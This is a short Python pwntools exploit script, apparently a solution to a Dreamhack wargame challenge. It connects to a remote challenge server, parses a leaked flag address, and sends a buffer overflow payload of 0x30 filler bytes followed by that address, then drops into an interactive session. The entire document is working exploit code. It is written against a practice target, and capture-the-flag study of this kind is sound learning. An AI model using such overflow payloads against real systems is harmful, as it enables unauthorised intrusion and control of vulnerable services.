from pwn import *

p = remote('host8.dreamhack.games', 11191)

p.recvuntil('real flag address (mmapped address): ')
flag = int(p.recvline().strip(), 16)

payload = b'A'*0x30
payload += p64(flag)

p.sendline(payload)

p.interactive()